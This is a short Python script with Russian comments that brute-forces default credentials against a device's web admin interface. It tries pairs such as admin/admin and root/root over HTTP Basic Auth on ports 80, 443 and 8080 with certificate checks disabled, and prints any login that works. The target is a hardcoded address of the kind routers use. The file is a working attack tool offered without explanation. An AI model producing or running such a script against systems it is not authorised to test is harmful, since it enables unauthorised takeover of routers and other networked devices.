import requests
from requests.auth import HTTPBasicAuth

def main(target_ip):
    """
    Быстрая проверка самых распространенных комбинаций
    """
    common_combinations = [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "1234"),
        ("admin", "12345"),
        ("admin", ""),
        ("root", "root"),
        ("root", "admin"),
        ("administrator", "administrator")
    ]
    
    ports = [80, 443, 8080]
    
    for port in ports:
        for protocol in ['http', 'https']:
            url = f"{protocol}://{target_ip}:{port}/"
            
            for username, password in common_combinations:
                try:
                    response = requests.get(
                        url, 
                        auth=HTTPBasicAuth(username, password),
                        timeout=3,
                        verify=False
                    )
                    
                    if response.status_code == 200:
                        return url, username, password
                        
                except:
                    continue
    
    return None, None, None

# Быстрая проверка
target_ip = "192.168.88.1"
url, username, password = main(target_ip)

if url and username and password:
    print("Быстрый подбор успешен!")
    print(f"URL: {url}")
    print(f"Логин: {username}") 
    print(f"Пароль: {password}")
else:
    print("Запустите полную версию скрипта для расширенного поиска")
